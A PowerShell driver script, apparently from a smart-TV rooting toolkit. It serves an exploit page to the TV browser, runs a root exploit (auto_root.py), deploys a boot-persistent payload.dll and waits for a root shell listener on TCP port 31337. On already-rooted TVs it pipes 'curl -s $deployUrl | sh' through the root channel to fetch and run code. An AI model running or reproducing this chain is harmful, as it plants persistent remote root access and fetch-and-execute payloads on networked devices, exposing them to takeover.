<#
.SYNOPSIS
  One-command TV root: start the server, wait for the browser stub, root it,
  deploy the boot payload, then wait for permanent root after the reboot.

.DESCRIPTION
  The only manual steps left are on the TV remote: open the page, then reboot.

    pwsh -File .\root.ps1 -TvIp <tv-ip>

  The script expects tools/ and server/ beside it (or -ToolkitDir). If port 80
  is already served by a different server, pass -RestartServer to replace it.

  deploy.sh is a template that server.py renders per request (H= is the address
  the TV fetched it from; WANT=/SIZE_WANT= are the payload.dll hash/size). There
  is no generated deploy_local.sh any more: a stale copy of it gated the wrong
  payload build and broke both deploy and recover.

.PARAMETER TvIp
  TV address (or set ROOT_TV).

.PARAMETER HostIp
  PC address as seen by the TV. Auto-detected from the route to the TV if
  omitted (never guessed from "first non-loopback", which can be a VPN adapter).

.PARAMETER ToolkitDir
  Directory containing tools/ and server/.

.PARAMETER Python
  Interpreter for the clients/server. Auto-detected; on Windows a renamed copy
  (pysrv.exe) may be needed for the firewall to allow port 80.

.EXAMPLE
  pwsh -File .\root.ps1 -TvIp 192.168.1.50 -DryRun
#>
[CmdletBinding()]
param(
    [string]$TvIp = $env:ROOT_TV,
    [string]$HostIp,
    [string]$ToolkitDir,
    [string]$Python,
    [string]$Page = "index.html",
    [switch]$NoServer,
    [switch]$RestartServer,
    [switch]$NoWait,
    [switch]$Force,
    [switch]$DryRun,
    [int]$StubWaitSec = 0,
    [int]$BootTimeoutSec = 180
)

$ErrorActionPreference = "Stop"

function Say([string]$m) { Write-Host $m }

function Find-Layout {
    param([string]$Hint)
    $cands = @()
    if ($Hint) { $cands += (Resolve-Path -LiteralPath $Hint).Path }
    $cands += $PSScriptRoot
    foreach ($c in $cands) {
        if (-not $c -or -not (Test-Path -LiteralPath $c)) { continue }
        $c = (Resolve-Path -LiteralPath $c).Path
        $server = Join-Path $c "server\server.py"
        $tools = Join-Path $c "tools"
        $deploy = Join-Path $c "server\deploy.sh"
        if ((Test-Path -LiteralPath $server) -and (Test-Path -LiteralPath $deploy) -and
            (Test-Path -LiteralPath (Join-Path $tools "auto_root.py"))) {
            return [pscustomobject]@{
                Root      = $c
                Server    = $server
                ServerDir = (Split-Path -LiteralPath $server)
                Tools     = $tools
                Deploy    = $deploy
            }
        }
    }
    throw "Toolkit not found: expected tools/ + server/ beside root.ps1 (or pass -ToolkitDir)."
}

function Find-Python {
    param([string]$Explicit)
    if ($Explicit) {
        if (Test-Path -LiteralPath $Explicit) { return (Resolve-Path -LiteralPath $Explicit).Path }
        $c = Get-Command $Explicit -ErrorAction SilentlyContinue
        if ($c) { return $c.Source }
        throw "-Python '$Explicit' is neither a path nor a command on PATH."
    }
    if ($env:ROOT_PYTHON) {
        if (Test-Path -LiteralPath $env:ROOT_PYTHON) { return $env:ROOT_PYTHON }
        $c = Get-Command $env:ROOT_PYTHON -ErrorAction SilentlyContinue
        if ($c) { return $c.Source }
        throw "ROOT_PYTHON='$($env:ROOT_PYTHON)' does not resolve."
    }
    $cmd = Get-Command pysrv.exe -ErrorAction SilentlyContinue
    if ($cmd) { return $cmd.Source }
    $base = Join-Path $env:LOCALAPPDATA "Python"
    if (Test-Path -LiteralPath $base) {
        $p = Get-ChildItem -LiteralPath $base -Recurse -Filter pysrv.exe -ErrorAction SilentlyContinue |
             Select-Object -First 1
        if ($p) { return $p.FullName }
    }
    $cmd = Get-Command python -ErrorAction SilentlyContinue
    if ($cmd) { return $cmd.Source }
    throw "python not found; pass -Python <path>."
}

function Get-LocalAddressFor {
    # Ask the routing table which local address would reach the TV.  The old
    # heuristic (first address with the TV's /24, else first non-loopback) could
    # return a VPN/Wi-Fi adapter, and the TV then fetched from an unreachable
    # address with no error (review finding M5, 2026-10-26).
    param([string]$Tv)
    try {
        $route = Find-NetRoute -RemoteIPAddress $Tv -ErrorAction Stop |
                 Where-Object { $_.IPAddress } | Select-Object -First 1
        if ($route -and $route.IPAddress -and $route.IPAddress -notlike '127.*') {
            return $route.IPAddress
        }
    } catch { }
    $ip = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
          Where-Object { $_.AddressState -eq 'Preferred' -and $_.IPAddress -notlike '127.*' -and
                         $_.IPAddress -notlike '169.254.*' } |
          Select-Object -First 1 -ExpandProperty IPAddress
    if ($ip) { return $ip }
    throw "Could not determine this PC's address on the TV's network; pass -HostIp <ipv4>."
}

function Test-TvPort {
    # Raw TCP connect with a short timeout - deliberately NOT ping and NOT
    # Test-NetConnection.  On this PC a VPN tunnel answers ICMP
    # "destination net unreachable" and Windows ping reports it as a reply
    # (0% loss, exit 0); a proxy-ARP router can answer for an offline TV too.
    # Only a TCP connect says anything about the TV.
    param([string]$Tv, [int]$Port)
    $c = New-Object Net.Sockets.TcpClient
    try {
        $r = $c.BeginConnect($Tv, $Port, $null, $null)
        if (-not $r.AsyncWaitHandle.WaitOne(1500)) {
            return $false   # Close() in finally cancels the pending connect
        }
        $c.EndConnect($r)
        return $true
    } catch { return $false } finally { $c.Close() }
}

function Test-LocalListen {
    param([int]$Port, [switch]$LoopbackOnly)
    $conns = Get-NetTCPConnection -LocalPort $Port -State Listen -ErrorAction SilentlyContinue
    if (-not $conns) { return $false }
    if ($LoopbackOnly) { return ($conns | Where-Object { $_.LocalAddress -eq '127.0.0.1' }).Count -gt 0 }
    return ($conns | Where-Object { $_.LocalAddress -notlike '127.*' }).Count -gt 0
}

function Test-Page {
    param([string]$Name)
    try {
        $r = Invoke-WebRequest -Uri "http://127.0.0.1/$Name" -UseBasicParsing -TimeoutSec 3
        return ($r.StatusCode -eq 200)
    } catch { return $false }
}

function Test-OwnServer {
    # Prove the server on :80 serves *this* directory, not some other copy.
    param([string]$ServerDir)
    $nonce = [guid]::NewGuid().ToString("N")
    $probe = Join-Path $ServerDir (".root_probe_" + $nonce)
    try {
        Set-Content -LiteralPath $probe -Value $nonce -Encoding ascii -NoNewline
        $r = Invoke-WebRequest -Uri "http://127.0.0.1/$([IO.Path]::GetFileName($probe))" -UseBasicParsing -TimeoutSec 3
        $body = if ($r.Content -is [byte[]]) { [Text.Encoding]::UTF8.GetString($r.Content) } else { [string]$r.Content }
        return ($body.Trim() -eq $nonce)
    } catch { return $false }
    finally { Remove-Item -LiteralPath $probe -Force -ErrorAction SilentlyContinue }
}

function Stop-ToolkitServer {
    $conn = Get-NetTCPConnection -LocalPort 80 -State Listen -ErrorAction SilentlyContinue |
            Select-Object -First 1
    if (-not $conn) { return }
    $proc = Get-CimInstance Win32_Process -Filter "ProcessId=$($conn.OwningProcess)" -ErrorAction SilentlyContinue
    if ($proc -and $proc.Name -match 'python|pysrv' -and $proc.CommandLine -match '(shellsrv|server)\.py') {
        Say "server  : stopping pid $($proc.ProcessId) ($($proc.Name))"
        Stop-Process -Id $proc.ProcessId -Force
        Start-Sleep -Milliseconds 600
    } else {
        throw "port 80 is held by $($proc.Name) (pid $($conn.OwningProcess)); refusing to kill it"
    }
}

function Start-ToolkitServer {
    param($Layout, [string]$Py)
    $logDir = Join-Path $Layout.ServerDir "logs"
    New-Item -ItemType Directory -Force -Path $logDir | Out-Null
    $out = Join-Path $logDir "server.out"
    $err = Join-Path $logDir "server.err"
    $p = Start-Process -FilePath $Py -ArgumentList "server.py" -WorkingDirectory $Layout.ServerDir `
        -RedirectStandardOutput $out -RedirectStandardError $err -PassThru -WindowStyle Hidden
    $deadline = (Get-Date).AddSeconds(10)
    while (-not (Test-LocalListen -Port 80)) {
        if ((Get-Date) -gt $deadline) {
            Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
            throw "server did not bind :80 (see $err)"
        }
        Start-Sleep -Milliseconds 250
    }
    Say "server  : pid $($p.Id) listening on :80"
}

if (-not $TvIp) { throw "Pass -TvIp <tv-ip> (or set ROOT_TV)." }
$TvParsed = $null
if (-not [Net.IPAddress]::TryParse($TvIp, [ref]$TvParsed)) {
    throw "-TvIp '$TvIp' is not an IPv4 address (the payload's allowlist compares IPs)."
}

$layout = Find-Layout -Hint $ToolkitDir
$py = Find-Python -Explicit $Python
if ($HostIp) {
    $HostParsed = $null
    if (-not [Net.IPAddress]::TryParse($HostIp, [ref]$HostParsed)) {
        throw "-HostIp '$HostIp' is not an IPv4 address."
    }
} else {
    $HostIp = Get-LocalAddressFor -Tv $TvIp
}

$url = "http://$HostIp/$Page"
$deployUrl = "http://$HostIp/deploy.sh"
$serverUp = Test-LocalListen -Port 80
$serverOurs = if ($serverUp -and -not $DryRun) { Test-OwnServer -ServerDir $layout.ServerDir } else { $false }
$pageOk = if ($serverOurs) { Test-Page -Name $Page } else { $false }
$tvRooted = Test-TvPort -Tv $TvIp -Port 31337

Say "=== TV root ==============================================="
Say "toolkit : $($layout.Root)"
Say "python  : $py"
Say "TV      : $TvIp"
Say "host    : $HostIp"
Say "page    : $url"
Say "deploy  : $deployUrl (rendered by server.py)"
if ($DryRun) { Say "mode    : DRY RUN" }
Say "==========================================================="

if ($DryRun) {
    Say ""
    if (-not $serverUp) {
        Say "server on :80 : not listening (would start $($layout.Server))"
    } elseif ($serverOurs -and $pageOk) {
        Say "server on :80 : this toolkit's server (would reuse)"
    } elseif ($serverOurs) {
        Say "server on :80 : this toolkit, but /$Page is not 200"
    } else {
        Say "server on :80 : a DIFFERENT server (would need -RestartServer)"
    }
    Say "31337 on TV   : $(if ($tvRooted) { 'open (TV looks rooted)' } else { 'closed' })"
    if ($tvRooted -and -not $Force) {
        Say "would        : stop (already rooted; pass -Force to redeploy over 31337)"
    } elseif ($tvRooted) {
        Say "would run     : $py $($layout.Tools)\root_shell.py `"curl -s $deployUrl | sh`" $TvIp"
    } else {
        Say "would run     : $py $($layout.Tools)\auto_root.py --host $HostIp --script deploy.sh --stub-wait $StubWaitSec --root-retries 3"
        Say "then wait     : 31337 for up to $BootTimeoutSec s after the reboot"
    }
    exit 0
}

# Ping proves nothing on this setup: when the PC is off the TV's LAN (Wi-Fi or
# VPN up) the tunnel gateway answers ICMP "net unreachable" and Windows ping
# still prints 0% loss / exit 0, and when the TV is merely off a proxy-ARP
# router can answer for it.  The honest reachability signal is TCP.
if (-not $tvRooted) {
    $stockUp = $false
    foreach ($p in 8001, 8002, 7676, 9197) {
        if (Test-TvPort -Tv $TvIp -Port $p) { $stockUp = $true; break }
    }
    if (-not $stockUp) {
        Say "warning : no TCP service answers on the TV (31337 closed, stock ports 8001/8002/7676/9197 silent)."
        Say "          Do not trust ping to decide this - see the ICMP trap in AGENTS.md section 8."
        Say "          If the TV is actually on, check that this PC is on the TV's LAN and the VPN is off."
    }
}

if ($tvRooted -and -not $Force) {
    Say ""
    Say "Port 31337 is already open - this TV is rooted."
    Say "Use -Force to check/redeploy anyway (no page load needed: the deploy goes over 31337)."
    exit 0
}

if ($NoServer) {
    if (-not ($serverOurs -and $pageOk)) { throw "-NoServer given but this toolkit's /$Page is not served on :80" }
    Say "server  : using the existing server (-NoServer)"
} elseif ($serverUp -and $RestartServer) {
    # always restart on request: clears stale RPC waiters from earlier runs
    Stop-ToolkitServer
    Start-ToolkitServer -Layout $layout -Py $py
} elseif ($serverUp -and $serverOurs -and $pageOk) {
    Say "server  : reusing the server on :80"
} elseif ($serverUp) {
    throw "port 80 is served by another server. Re-run with -RestartServer to replace it."
} else {
    Start-ToolkitServer -Layout $layout -Py $py
}

if (-not (Test-Page -Name $Page)) { throw "server is not serving /$Page after start" }
foreach ($f in "deploy.sh", "payload.dll") {
    if (-not (Test-Page -Name $f)) { throw "server is not serving /$f after start" }
}

if ($tvRooted -and $Force) {
    # Already rooted: deploy over the 31337 channel.  This needs no page load and
    # no stub, and avoids the trap where a payload still hunting for root holds
    # /dev/video40 and the browser stub cannot open it.
    Say ""
    Say "1) Redeploying over the existing root channel (31337)..."
    $cmd = "curl -s $deployUrl | sh"
    # deploy.sh can take longer than the 30 s default reply timeout (it sleeps
    # before restarting the app); the payload's own Run() cap is 120 s.
    $env:ROOT_SHELL_TIMEOUT = "180"
    $out = & $py (Join-Path $layout.Tools "root_shell.py") $cmd $TvIp | Out-String
    Write-Host $out
    if ($LASTEXITCODE -ne 0 -or $out -notmatch "DEPLOY_DONE" -or $out -notmatch "COPY=ok") {
        Say "Redeploy over 31337 failed (exit $LASTEXITCODE)."
        Say "Reload $url and run again, or use server/recover.sh from a root shell."
        exit 1
    }
    Say ""
    Say "2) Deploy verified. The deploy restarts the app, so 31337 can be down for ~10 s."
    if (-not $NoWait) {
        $deadline = (Get-Date).AddSeconds($BootTimeoutSec)
        while ((Get-Date) -lt $deadline -and -not (Test-TvPort -Tv $TvIp -Port 31337)) {
            Start-Sleep -Seconds 2
        }
        if (-not (Test-TvPort -Tv $TvIp -Port 31337)) {
            Say "31337 did not come back within $BootTimeoutSec s - check beacons.log."
            exit 1
        }
        Say "31337 is back; payload active."
    }
    exit 0
}

Say ""
Say "1) ON THE TV, with its remote, open this URL:"
Say ""
Say "     $url"
Say ""
Say "   Wait until the page shows RUNNING, then leave it in the foreground."
Say "   The script CANNOT open the TV browser for you - it is waiting now,"
Say "   and will remind you every 30 s if the page has not connected."
Say "   If a stub dies during root, it will ask you to RELOAD the page once"
Say "   and then continues automatically (up to 3 fresh stubs)."
Say ""
& $py (Join-Path $layout.Tools "auto_root.py") --host $HostIp --script "deploy.sh" `
    --wait 150 --stub-wait $StubWaitSec --page $Page --heartbeat 30 --root-retries 3
if ($LASTEXITCODE -ne 0) {
    Say ""
    Say "Deploy failed (exit $LASTEXITCODE)."
    Say "- if the page was never opened, open $url on the TV and run again"
    Say "- if it was opened, reload it once and run again (the stub may have died)"
    Say "- see docs/FAILED.md for the stub traps"
    exit 1
}

Say ""
Say "2) Deploy verified (the payload md5 matched)."
Say "   NOTE: deploy.sh kill -9s the running payload so AUL loads the new DLL;"
Say "   31337 can open WITHOUT a reboot. That proves the payload runs, not that"
Say "   it starts at boot - only a reboot proves persistence."
if ($NoWait) { exit 0 }

Say "   waiting for TCP 31337 (up to $BootTimeoutSec s)..."
$deadline = (Get-Date).AddSeconds($BootTimeoutSec)
$up = $false
while ((Get-Date) -lt $deadline) {
    if (Test-TvPort -Tv $TvIp -Port 31337) { $up = $true; break }
    Start-Sleep -Seconds 5
}
if (-not $up) {
    Say "31337 did not come up within $BootTimeoutSec s."
    Say "Check the beacon log ($($layout.ServerDir)\logs\beacons.log), then run:"
    Say "  $py $($layout.Tools)\root_shell.py `"id`" $TvIp"
    exit 1
}
Say ""
Say "31337 is up (restarted app). Now REBOOT the TV with the browser closed, then verify:"
Say "  $py $($layout.Tools)\root_shell.py `"id`" $TvIp"
exit 0
